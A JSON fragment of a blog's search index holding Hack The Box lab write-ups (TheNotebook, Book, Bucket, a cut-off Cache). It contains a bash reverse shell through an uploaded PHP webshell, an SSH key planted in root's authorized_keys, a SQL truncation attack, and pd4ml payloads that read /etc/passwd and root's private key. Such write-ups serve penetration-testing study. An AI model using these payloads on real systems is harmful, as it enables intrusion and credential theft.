AAAAB3NzaC1yc2EAAAADAQABAAABAQDo+qtyTekC0IbR253hJRsWT9Q+wCFVUEwHS7/VZJEOvePL+oIm2LZp9G1ml3FToU6Qr2MtB83tJU7mMFqcKm3mfVTj+lpJzP+XO4A/xHzLiqhZScv56FM0JaZqz65/Oca4FF4AiNS0gOwJ7vu5sARMYFbb5jsd266eCFvymRLobt3Ujzo5lqcRiLOgZPVCasfHU0vPCNGTaMvDKyklhwSCsMbKjOxuozbwZwJ1ApsCkkx7bx277DGgOI6G/rLYFkc/W/+Y9hxqp4RifUzgu6GACKDIKyAnszWxZHNMT/Iokkcn35Xd5p/ykVgrjLBDQKCxTr4Org/M7L9xhvd19GbH kali@kali\u0026#39; \u0026gt; /root/.ssh/authorized_keys root@0f4c2517af40:/opt/webapp# noah@thenotebook:~$ sudo docker exec -it webapp-dev01 /bin/sh No help topic for \u0026#39;/bin/sh\u0026#39; Connect to ssh ","date":"November 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/thenotebook/images/thenotebook.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/thenotebook/","summary":"TheNotebook Enumeration nmap └─$ nmap -Pn -p- 10.10.10.230 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 08:23 GMT Warning: 10.10.10.230 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.230 (10.10.10.230) Host is up (0.18s latency). Not shown: 56578 closed tcp ports (conn-refused), 8955 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 212.","tags":["HTB","jwt","jwt-io","upload","webshell","cve-2019-5736","runc","docker","go"],"title":"[HTB] Machine: TheNotebook"},{"categories":null,"contents":"Book Enumeration nmap └─$ nmap -Pn -p- 10.10.10.176 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:41 BST Nmap scan report for 10.10.10.176 (10.10.10.176) Host is up (0.18s latency). Not shown: 65521 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.176 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:43 BST Nmap scan report for 10.10.10.176 (10.10.10.176) Host is up (0.42s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA) | 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA) |_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: LIBRARY - Read | Learn | Have Fun |_http-server-header: Apache/2.4.29 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.176 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /search.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /home.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 6800] /profile.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /docs (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.176/docs/] /.html (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.176/images/] /books.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /feedback.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /download.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /contact.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /admin (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.176/admin/] /db.php (Status: 200) [Size: 0] /logout.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /collections.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /settings.php (Status: 302) [Size: 0] [--\u0026gt; index.php] Foothold/User Let\u0026rsquo;s register on website and start looking around We have upload page and contact page There is also /admin endpoint Defaults creds don\u0026rsquo;t work Basic sqli don\u0026rsquo;t work either Then based on hints from forum I got an idea that it was SQL truncation atack https://book.hacktricks.xyz/pentesting-web/sql-injection#sql-truncation-attack If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user admin, try to create a username called: \u0026quot;admin [30 spaces] a\u0026quot; and any password. The database will check if the introduced username exists inside the database. If not, it will cut the username to the max allowed number of characters (in this case to: \u0026quot;admin [25 spaces]\u0026quot;) and the it will automatically remove all the spaces at the end updating inside the database the user \u0026quot;admin\u0026quot; with the new password (some error could appear but it doesn't means that this hasn't worked). Let\u0026rsquo;s try to perform the attack We know that admin\u0026rsquo;s email is admin@book.htb If I try to register using admin@book.htb, it says that user already exists I\u0026rsquo;ll go over to Burp and try to detect the string size We can enumerate users via the Sign up form, but since there is a high possibility that it is a SQL truncation atack, I will add bunch of spaces followed by a any non-space char And it looks like the string size is 20 chars Based on js script code on index.php Now we can login as admin to /admin Root ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/book/images/book.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/book/","summary":"Book Enumeration nmap └─$ nmap -Pn -p- 10.10.10.176 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:41 BST Nmap scan report for 10.10.10.176 (10.10.10.176) Host is up (0.18s latency). Not shown: 65521 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.176 --min-rate 5000 Starting Nmap 7.","tags":["HTB"],"title":"[HTB] Machine: Book"},{"categories":null,"contents":"Bucket Enumeration nmap └─$ nmap -Pn -p- 10.10.10.212 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 16:05 GMT Warning: 10.10.10.212 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.212 (10.10.10.212) Host is up (0.18s latency). Not shown: 60507 closed tcp ports (conn-refused), 5026 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 157.48 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.212 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 16:25 GMT Nmap scan report for 10.10.10.212 (10.10.10.212) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to http://bucket.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds Web Server gobuster └─$ gobuster dir -u http://bucket.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://bucket.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: js,php,txt,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 275] /.html (Status: 403) [Size: 275] /index.html (Status: 200) [Size: 5344] vhosts └─$ wfuzz -u http://bucket.htb/ -H \u0026#39;Host: FUZZ.bucket.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://bucket.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000247: 404 0 L 2 W 21 Ch \u0026#34;s3\u0026#34; 000009532: 400 12 L 53 W 422 Ch \u0026#34;#www\u0026#34; 000010581: 400 12 L 53 W 422 Ch \u0026#34;#mail\u0026#34; Total time: 0 Processed Requests: 19966 Filtered Requests: 19963 Requests/sec.: 0 gobuster └─$ gobuster dir -u http://s3.bucket.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://s3.bucket.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /health (Status: 200) [Size: 54] /shell (Status: 200) [Size: 0] /shell.js (Status: 500) [Size: 158] /shell.html (Status: 500) [Size: 158] /shell.txt (Status: 500) [Size: 158] /shell.php (Status: 500) [Size: 158] s3.bucket.htb HTTP/1.1 404 Date: Wed, 08 Nov 2023 13:54:42 GMT Server: hypercorn-h11 content-type: text/html; charset=utf-8 content-length: 21 access-control-allow-origin: * access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging access-control-expose-headers: x-amz-version-id Connection: close {\u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;} Looks like s3 hosts images and index.html which points to bucket.htb Foothold Based on header information we can confirm it\u0026rsquo;s AWS aws s3 bucket - are refered to the containers where you can store your file and retrieve when ever you required. http://s3.\u0026lt;HOST\u0026gt;/\u0026lt;BUCKET\u0026gt;/\u0026lt;FILE\u0026gt; We have to install awscli for easier interaction apt install awscli Currently the idea is to perform a webshell upload Thus we have to check if we can upload to bucket We have to check if it\u0026rsquo;s misconfigured (thus allows anonymous access) After installation we have to configure credentials for interaction └─$ aws s3 --endpoint-url http://s3.bucket.htb ls Unable to locate credentials. You can configure credentials by running \u0026#34;aws configure\u0026#34;. └─$ aws configure AWS Access Key ID [None]: pentest AWS Secret Access Key [None]: pentest Default region name [None]: pentest Default output format [None]: Well it looks like it allows anonymous access └─$ aws s3 --endpoint-url http://s3.bucket.htb ls 2023-11-08 14:11:03 adserver └─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver PRE images/ 2023-11-08 14:13:04 5344 index.html └─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/images/ 2023-11-08 14:15:04 37840 bug.jpg 2023-11-08 14:15:04 51485 cloud.png 2023-11-08 14:15:04 16486 malware.png We can check cp command and try to upload php webshell └─$ aws s3 --endpoint-url http://s3.bucket.htb cp cmd.php s3://adserver/cmd.php upload: ./shell.php to s3://adserver/shell.php └─$ curl http://bucket.htb/cmd.php \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The requested URL was not found on this server.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at bucket.htb Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Maybe it doesn\u0026rsquo;t allow php extensions We could try to upload txt file but save it as php Note: I tried shell.\u0026lt;EXTENSION\u0026gt;, didn\u0026rsquo;t work shell probably blacklisted or it got erased (since there\u0026rsquo;s a cleanup script running) └─$ aws s3 --endpoint-url http://s3.bucket.htb cp cmd.txt s3://adserver/cmd.php upload: ./cmd.txt to s3://adserver/cmd.php └─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/ PRE images/ 2023-11-08 14:20:01 35 cmd.php 2023-11-08 14:19:04 5344 index.html └─$ curl http://bucket.htb/cmd.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data) Let\u0026rsquo;s get reverse shell └─$ curl http://bucket.htb/cmd.php --data-urlencode \u0026#39;cmd=bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; User roy has a project folder in home directory www-data@bucket:/home/roy/project$ ls -lha total 44K drwxr-xr-x 3 roy roy 4.0K Sep 24 2020 . drwxr-xr-x 3 roy roy 4.0K Sep 24 2020 .. -rw-rw-r-- 1 roy roy 63 Sep 24 2020 composer.json -rw-rw-r-- 1 roy roy 21K Sep 24 2020 composer.lock -rw-r--r-- 1 roy roy 367 Sep 24 2020 db.php drwxrwxr-x 10 roy roy 4.0K Sep 24 2020 vendor We have db.php file It uses DynamoDB www-data@bucket:/home/roy/project$ cat db.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); use Aws\\DynamoDb\\DynamoDbClient; use Aws\\DynamoDb\\Exception\\DynamoDbException; $client = new Aws\\Sdk([ \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); $dynamodb = $client-\u0026gt;createDynamoDb(); //todo Let\u0026rsquo;s try to connect to it via aws We can\u0026rsquo;t do it from the box www-data@bucket:/home/roy/project$ aws --endpoint-url http://127.0.0.1:4566 dynamodb list-tables You must specify a region. You can also configure your region by running \u0026#34;aws configure\u0026#34;. www-data@bucket:/home/roy/project$ aws configure AWS Access Key ID [None]: pentest AWS Secret Access Key [None]: pentest Default region name [None]: pentest Default output format [None]: [Errno 13] Permission denied: \u0026#39;/var/www/.aws\u0026#39; But we can from the attack box └─$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables { \u0026#34;TableNames\u0026#34;: [ \u0026#34;users\u0026#34; ] } └─$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users { \u0026#34;Items\u0026#34;: [ { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Management@#1@#\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Mgmt\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Welcome123!\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Cloudadm\u0026#34; } }, { \u0026#34;password\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;n2vM-\u0026lt;_K_Q:.Aa2\u0026#34; }, \u0026#34;username\u0026#34;: { \u0026#34;S\u0026#34;: \u0026#34;Sysadm\u0026#34; } } ], \u0026#34;Count\u0026#34;: 3, \u0026#34;ScannedCount\u0026#34;: 3, \u0026#34;ConsumedCapacity\u0026#34;: null } └─$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r \u0026#39;.Items[].password.S\u0026#39; Management@#1@# Welcome123! n2vM-\u0026lt;_K_Q:.Aa2 Find valid password └─$ crackmapexec ssh 10.10.10.212 -u roy -p password.list SSH 10.10.10.212 22 10.10.10.212 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4 SSH 10.10.10.212 22 10.10.10.212 [-] roy:Management@#1@# Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [-] roy:Welcome123! Authentication failed. SSH 10.10.10.212 22 10.10.10.212 [+] roy:n2vM-\u0026lt;_K_Q:.Aa2 We can ssh as roy └─$ sshpass -p \u0026#39;n2vM-\u0026lt;_K_Q:.Aa2\u0026#39; ssh roy@10.10.10.212 Warning: Permanently added \u0026#39;10.10.10.212\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 08 Nov 2023 02:51:55 PM UTC System load: 0.04 Usage of /: 33.8% of 17.59GB Memory usage: 21% Swap usage: 0% Processes: 244 Users logged in: 0 IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:f9ea 229 updates can be installed immediately. 103 of these updates are security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Sep 23 03:33:53 2020 from 10.10.14.2 roy@bucket:~$ Root /etc/apache2/sites-enabled/000-default.conf shows another site on port 8000 It\u0026rsquo;s ran as root roy@bucket:/var/www/bucket-app$ cat /etc/apache2/sites-enabled/000-default.conf \u0026lt;VirtualHost 127.0.0.1:8000\u0026gt; \u0026lt;IfModule mpm_itk_module\u0026gt; AssignUserId root root \u0026lt;/IfModule\u0026gt; DocumentRoot /var/www/bucket-app \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/html RewriteEngine On RewriteCond %{HTTP_HOST} !^bucket.htb$ RewriteRule /.* http://bucket.htb/ [R] \u0026lt;/VirtualHost\u0026gt; \u0026lt;SNIP\u0026gt; roy@bucket:/var/www/bucket-app$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:4566 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:46777 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 127.0.0.53:53 0.0.0.0:* - Let\u0026rsquo;s check bucket-app roy@bucket:/var/www/bucket-app$ ls -lha total 856K drwxr-x---+ 4 root root 4.0K Feb 10 2021 . drwxr-xr-x 4 root root 4.0K Feb 10 2021 .. -rw-r-x---+ 1 root root 63 Sep 23 2020 composer.json -rw-r-x---+ 1 root root 21K Sep 23 2020 composer.lock drwxr-x---+ 2 root root 4.0K Feb 10 2021 files -rwxr-x---+ 1 root root 17K Sep 23 2020 index.php -rwxr-x---+ 1 root root 790K Jun 10 2020 pd4ml_demo.jar drwxr-x---+ 10 root root 4.0K Feb 10 2021 vendor I\u0026rsquo;ll also reconnect to ssh with -L 8000:localhost:8000 index.php On POST parameter get_alerts, it checks alerts table for Ransomware Then it will create a file win random filename in files and write the data column Then it converts html to pdf using pd4ml roy@bucket:/var/www/bucket-app$ cat index.php \u0026lt;?php require \u0026#39;vendor/autoload.php\u0026#39;; use Aws\\DynamoDb\\DynamoDbClient; if($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;]===\u0026#34;POST\u0026#34;) { if($_POST[\u0026#34;action\u0026#34;]===\u0026#34;get_alerts\u0026#34;) { date_default_timezone_set(\u0026#39;America/New_York\u0026#39;); $client = new DynamoDbClient([ \u0026#39;profile\u0026#39; =\u0026gt; \u0026#39;default\u0026#39;, \u0026#39;region\u0026#39; =\u0026gt; \u0026#39;us-east-1\u0026#39;, \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;latest\u0026#39;, \u0026#39;endpoint\u0026#39; =\u0026gt; \u0026#39;http://localhost:4566\u0026#39; ]); $iterator = $client-\u0026gt;getIterator(\u0026#39;Scan\u0026#39;, array( \u0026#39;TableName\u0026#39; =\u0026gt; \u0026#39;alerts\u0026#39;, \u0026#39;FilterExpression\u0026#39; =\u0026gt; \u0026#34;title = :title\u0026#34;, \u0026#39;ExpressionAttributeValues\u0026#39; =\u0026gt; array(\u0026#34;:title\u0026#34;=\u0026gt;array(\u0026#34;S\u0026#34;=\u0026gt;\u0026#34;Ransomware\u0026#34;)), )); foreach ($iterator as $item) { $name=rand(1,10000).\u0026#39;.html\u0026#39;; file_put_contents(\u0026#39;files/\u0026#39;.$name,$item[\u0026#34;data\u0026#34;]); } passthru(\u0026#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\u0026#34;); } } else { ?\u0026gt; \u0026lt;SNIP\u0026gt; We saw that DynamoDB doesn\u0026rsquo;t have alerts table So we should create it Follow the post └─$ aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 { \u0026#34;TableDescription\u0026#34;: { \u0026#34;AttributeDefinitions\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; }, { \u0026#34;AttributeName\u0026#34;: \u0026#34;data\u0026#34;, \u0026#34;AttributeType\u0026#34;: \u0026#34;S\u0026#34; } ], \u0026#34;TableName\u0026#34;: \u0026#34;alerts\u0026#34;, \u0026#34;KeySchema\u0026#34;: [ { \u0026#34;AttributeName\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;HASH\u0026#34; }, { \u0026#34;AttributeName\u0026#34;: \u0026#34;data\u0026#34;, \u0026#34;KeyType\u0026#34;: \u0026#34;RANGE\u0026#34; } ], \u0026#34;TableStatus\u0026#34;: \u0026#34;ACTIVE\u0026#34;, \u0026#34;CreationDateTime\u0026#34;: \u0026#34;2023-11-08T15:15:17.848000+00:00\u0026#34;, \u0026#34;ProvisionedThroughput\u0026#34;: { \u0026#34;LastIncreaseDateTime\u0026#34;: \u0026#34;1970-01-01T00:00:00+00:00\u0026#34;, \u0026#34;LastDecreaseDateTime\u0026#34;: \u0026#34;1970-01-01T00:00:00+00:00\u0026#34;, \u0026#34;NumberOfDecreasesToday\u0026#34;: 0, \u0026#34;ReadCapacityUnits\u0026#34;: 10, \u0026#34;WriteCapacityUnits\u0026#34;: 5 }, \u0026#34;TableSizeBytes\u0026#34;: 0, \u0026#34;ItemCount\u0026#34;: 0, \u0026#34;TableArn\u0026#34;: \u0026#34;arn:aws:dynamodb:us-east-1:000000000000:table/alerts\u0026#34; } } └─$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables { \u0026#34;TableNames\u0026#34;: [ \u0026#34;alerts\u0026#34;, \u0026#34;users\u0026#34; ] } Let\u0026rsquo;s create an item └─$ aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item \u0026#39;{\u0026#34;title\u0026#34;:{\u0026#34;S\u0026#34;:\u0026#34;Ransomware\u0026#34;},\u0026#34;data\u0026#34;:{\u0026#34;S\u0026#34;:\u0026#34;TEST\u0026#34;}}\u0026#39; { \u0026#34;ConsumedCapacity\u0026#34;: { \u0026#34;TableName\u0026#34;: \u0026#34;alerts\u0026#34;, \u0026#34;CapacityUnits\u0026#34;: 1.0 } } Trigget the app └─$ curl http://127.0.0.1:8000/index.php --data \u0026#39;action=get_alerts\u0026#39; roy@bucket:/var/www/bucket-app/files$ ls 348.html result.pdf So Documentation We can attach files Paylaod: \u0026lt;html\u0026gt;\u0026lt;pd4ml:attachment src=\\\u0026quot;/etc/passwd\\\u0026quot; description=\\\u0026quot;attachment sample\\\u0026quot; icon=\\\u0026quot;Paperclip\\\u0026quot;/\u0026gt;\u0026lt;/html\u0026gt; Let\u0026rsquo;s test it We might have to create table again, since it gets deleted └─$ aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item \u0026#39;{\u0026#34;title\u0026#34;:{\u0026#34;S\u0026#34;:\u0026#34;Ransomware\u0026#34;},\u0026#34;data\u0026#34;:{\u0026#34;S\u0026#34;:\u0026#34;\u0026lt;html\u0026gt;\u0026lt;pd4ml:attachment src=\\\u0026#34;/etc/passwd\\\u0026#34; description=\\\u0026#34;attachment sample\\\u0026#34; icon=\\\u0026#34;Paperclip\\\u0026#34;/\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;}}\u0026#39; { \u0026#34;ConsumedCapacity\u0026#34;: { \u0026#34;TableName\u0026#34;: \u0026#34;alerts\u0026#34;, \u0026#34;CapacityUnits\u0026#34;: 1.0 } } └─$ curl http://127.0.0.1:8000/index.php --data \u0026#39;action=get_alerts\u0026#39; └─$ sshpass -p \u0026#39;n2vM-\u0026lt;_K_Q:.Aa2\u0026#39; scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf . Okay, it works I assume, there is a id_rsa in root\u0026rsquo;s directory and I\u0026rsquo;ll try to grab it We can also create a script 0xdf shows that I\u0026rsquo;ll perform same steps as above but with different payload to grab a key \u0026lt;html\u0026gt;\u0026lt;pd4ml:attachment src=\\\u0026quot;/root/.ssh/id_rsa\\\u0026quot; description=\\\u0026quot;attachment sample\\\u0026quot; icon=\\\u0026quot;Paperclip\\\u0026quot;/\u0026gt;\u0026lt;/html\u0026gt; ssh as root └─$ ssh root@10.10.10.212 -i id_rsa Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 08 Nov 2023 03:42:33 PM UTC System load: 0.11 Usage of /: 33.9% of 17.59GB Memory usage: 22% Swap usage: 0% Processes: 245 Users logged in: 1 IPv4 address for br-bee97070fb20: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.212 IPv6 address for ens160: dead:beef::250:56ff:feb9:f9ea 229 updates can be installed immediately. 103 of these updates are security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue Feb 9 14:39:03 2021 root@bucket:~# ","date":"October 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bucket/images/bucket.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bucket/","summary":"Bucket Enumeration nmap └─$ nmap -Pn -p- 10.10.10.212 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 16:05 GMT Warning: 10.10.10.212 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.212 (10.10.10.212) Host is up (0.18s latency). Not shown: 60507 closed tcp ports (conn-refused), 5026 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 157.","tags":["HTB","s3","aws","awscli","vhosts","upload","webshell","php","dynamodb","tunnel","localstack","pd4ml","pdfdetach","getfacl","facl"],"title":"[HTB] Machine: Bucket"},{"categories":null,"contents":"Cache Enumeration nmap └─$ nmap -Pn -p- 10.10.10.188 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 16:53 GMT Nmap scan report for 10.10.10.188 (10.10.10.188) Host is up (0.17s latency). Not shown: 64028 filtered tcp ports (no-response), 1505 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 91.28 seconds └─$ nmap -Pn -p22,80,2201 -sC -sV 10.10.10.188 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-31 15:59 GMT Nmap scan report for 10.10.10.188 